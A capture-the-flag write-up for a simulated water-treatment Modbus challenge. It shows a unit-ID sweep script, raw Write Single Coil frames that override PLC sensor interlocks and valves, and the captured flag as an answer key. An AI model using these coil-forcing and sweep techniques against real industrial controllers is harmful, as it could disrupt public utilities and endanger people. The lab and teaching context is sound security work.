# State of Emergency - CTF Writeup

**Category:** ICS / Hardware (Modbus)

**Author:** Atlas

**Date:** 2026-07-05

**Tools Used:** netcat, Python 3 (raw `socket` scripting for the Modbus CLI), PDF analysis (challenge brief + official Modbus Application Protocol Specification V1.1b)

A state-hacking operation is targeting a capital city's water treatment facility. Malware has rendered the HMI/SCADA interfaces unusable and locked administrators out. The objective is to contaminate the public water supply with toxic chemicals from the treatment process. The only remaining access is a low-level netcat command-line interface into the serial Modbus network, with the goal of manipulating the two reachable PLCs (a Water Storage Tank and a Mixer Tank) to restore a safe, free flow of water and clear the chemicals out of the system.

## Water Treatment Facility - Modbus PLC Manipulation

### Overview

The provided brief (`water_treatment_facility.pdf`) gave:
- A facility diagram: Water Storage Tank → Mixer Tank (chemical added) → Water Treatment → Public Supply / Disposal.
- State diagrams and ladder logic for the Water Storage Tank (Wait → Filling → Drain, gated by `low_sensor`/`high_sensor`/`auto_mode`/`manual_mode`/`halt`, with `force_start_in`/`force_start_out` override branches).
- A simpler state diagram for the Mixer Tank (Wait → Filling & Mix → Drain, gated by `Water Valve On`/sensors).
- A remote lab diagram showing two coil address tables (one per PLC) reachable via a Laptop-1 → Laptop-2 → serial RTU Modbus gateway, with the note that Laptop-2 calculates and adds CRC before forwarding — and warnings to keep traffic low, avoid multi-coil writes, and identify the correct PLCs before acting.

Critically, neither coil table listed a Modbus unit/slave ID — only coil addresses — so the first real task was determining which unit ID on the bus corresponded to which physical device.

### Commands Used

**Input:** Connect to the challenge's netcat CLI and enumerate available commands.
```bash
nc <host> <port>
H
```
**Output:**
```
[*] Available commands:
system: Get system status
modbus: Send command to the network (hex format: AABBCCDDEE[FF])
exit: Exit the interface
```
`system` turned out to be an omniscient debug oracle exposing every internal PLC variable (including a `flag` field, initially `"HTB{}"`), while `modbus` is a one-way fire-and-forget channel into the real RTU bus — no Modbus responses are ever relayed back over it (confirmed by testing reads and a spec-mandated Diagnostics echo, both silent).

**Input:** Confirm the exact byte structure of the `modbus` command by probing the parser's own validation (deliberately malformed lengths), since Modbus's real ADU structure is `[UnitID][FunctionCode][Data...]`.
```
modbus 01
modbus 0102030405060708091011
```
**Output:** A 1-byte frame crashed the connection (index-out-of-range on direct byte access), an 11-byte frame parsed fine (extra bytes silently ignored). This confirmed the parser reads `unit` and `function code` via direct indexing (both mandatory, ≥2 bytes required) while address/value fields are read via slicing (tolerant of missing bytes) — matching the standard `[unit][func][addr_hi][addr_lo][val_hi][val_lo]` structure exactly as defined in the real Modbus Application Protocol Specification V1.1b (confirmed later by reading the actual spec PDF, section 6.5, Write Single Coil).

**Input:** Since coil writes to units 0–20 (obvious small-integer guesses) produced no effect at all, and Modbus responses can't be observed directly, discover the real unit ID by writing a distinctive, directly-observable coil (`manual_mode_control`, address `0x00C8`) across the full unit ID space in batches, comparing the full `system` JSON against baseline after each batch.
```python
for u in chunk:  # batches of 16 across 0-255
    write_coil(sock, u, "00c8", on=True)
resp = get_system(sock)
if resp != baseline: ...  # bisect within the changed chunk
```
**Output:**
```
!!! CHANGE in chunk 128-143 !!!
water tank:{"auto_mode": 0, "manual_mode": 1, ..., "manual_mode_control": 1, ...}
```
Bisecting within that chunk (using `cutoff`'s own raw field as a non-latched indicator, since `manual_mode_control` turned out to be edge-latched and couldn't be toggled back off for bisection) pinpointed **Water Storage Tank = unit `0x88`**. The same batch/bisect approach against the Mixer's own `start` coil (address `0x2D`) found **Mixer Tank = unit `0x35`**.

**Input:** With both units confirmed, apply the exact override sequence implied by the ladder logic — force `manual_mode` on, bypass the `high_sensor` gate on the tank's output valve via `force_start_out`, and clear `low_sensor` (a NOT-contact gating that path) — then force the **Mixer's own** `high_sensor` on to close its chemical inlet and open its output.
```
modbus 880500c8ff00   # water tank: manual_mode_control ON
modbus 880504d2ff00   # water tank: force_start_out ON
modbus 880500400000   # water tank: low_sensor OFF
modbus 35050044ff00   # MIXER: high_sensor ON (addr 0x44)
system
```
**Output:**
```
water tank:{"auto_mode": 0, "manual_mode": 1, ..., "in_valve": 1, "out_valve": 1, ...,
            "flag": "HTB{m15510n5_5ucc355_f4c1117y_53cu23d!@12r3}"}
mixer:{"auto_mode": 0, "in_vale": 0, "in_vale_water": 1, "out_valve": 1, "in_valve": 0,
       "start": 0, "low_sensor": 0, "high_sensor": 1}
```
Free flow achieved on both PLCs and the flag populated.

### Solution

**Answer:** `HTB{m15510n5_5ucc355_f4c1117y_53cu23d!@12r3}`

**Summary:** The challenge required reverse-engineering a purely event-driven Modbus RTU simulation exposed through a one-way netcat gateway (writes only, no responses ever relayed back — reads and even a spec-mandated Diagnostics echo confirmed this). With no response channel to lean on, unit-ID discovery had to be done indirectly: writing candidate values to a coil and diffing the full system-status oracle before/after, then bisecting within the batch that changed something. This correctly (if slowly) recovered both real unit IDs, `0x88` (Water Storage Tank) and `0x35` (Mixer Tank) — matching the values in the official writeup. The final unlock required combining the Water Tank's documented override branch (`manual_mode` + `force_start_out` + clearing `low_sensor`, all needed because `low_sensor` sits *after* the manual-mode node in the ladder and blocks the output valve regardless of manual override) with forcing the **Mixer's own** `high_sensor`, which closes its chemical inlet and opens its output — the actual "clear the chemicals out" step, and the one piece that had been mis-targeted at the wrong PLC for most of the session.

**Scripts:**
- [full_sweep2.py](scripts/full_sweep2.py) — batch unit-ID sweep + bisection that found the Water Tank's real unit ID (`0x88`) via `manual_mode_control`/`cutoff`.
- [verify_deviceid.py](scripts/verify_deviceid.py) — confirms Read Device Identification (FC `0x2B`/MEI `0x0E`) is the correct, fast way to enumerate unit IDs (see Dead Ends below).
- [solve.py](scripts/solve.py) — final 4-command solution sequence that produces the flag.

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Guessing unit IDs as small integers (0, 1, 2, 17, etc.) with FC 0x05 writes | Real unit IDs (`0x88`, `0x35`) are arbitrary and unrelated to the logical naming ("Water Tank 1") | Don't assume device IDs follow the diagram's human-readable numbering; they must be discovered |
| Trying alternate frame structures (function-code-first ordering, single-byte values, literal-decimal-as-hex addressing, manually appended CRC) | The real structure was the standards-compliant one all along (`[unit][func][addr_hi][addr_lo][val_hi][val_lo]`, no CRC needed) | Trust the official protocol spec over ad hoc guesses; a targeted parser-crash test (too-short frames) settled the byte structure definitively |
| Testing FC `0x2B`/MEI `0x0E` (Read Device Identification) early on | The test coincided with a leftover open `nc` session elsewhere (this challenge only allows one active connection), so the request silently got nothing back, and a later retry accidentally broke the frame order | This was actually the *intended*, fast solution to unit-ID discovery (per the official writeup) — confirmed working later with a clean connection, instantly returning `VendorName`/`ProductCode` for valid units. Should have ruled out connection-state issues before concluding the technique didn't work |
| Forcing `high_sensor` ON on the Water Tank (unit `0x88`) | That specific coil is non-writable there in this simulation | The actual required write was the **Mixer's own** `high_sensor` (unit `0x35`, addr `0x44`) — always double-check which PLC a given documented coil actually belongs to |
| Polling `system` repeatedly with no writes, waiting for time-based progress | State never changed - the simulation is purely event-driven | Don't assume an ICS simulation runs on a clock; verify empirically before waiting on it |
| Bisecting via toggling `manual_mode_control` OFF | The coil is edge-latched (a one-way "set"); writing 0 didn't clear it | Pick a reversible/level signal, or a coil's own raw JSON field, for bisection tests — account for latch/edge-trigger behavior in ladder logic |

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Facility Neutralization | `HTB{m15510n5_5ucc355_f4c1117y_53cu23d!@12r3}` | Forced Water Tank into manual override (bypassing the low-sensor block on its output valve) to establish free flow into the Mixer, then forced the Mixer's own high_sensor ON to shut its chemical inlet and open its output, clearing the chemicals and securing the facility. |

## References

- MODBUS Application Protocol Specification V1.1b (modbus.org) — function code definitions (esp. §6.5 Write Single Coil, §6.21 Read Device Identification)
- HackTheBox official writeup, *State of Emergency* (D22.102.296, author diogt)
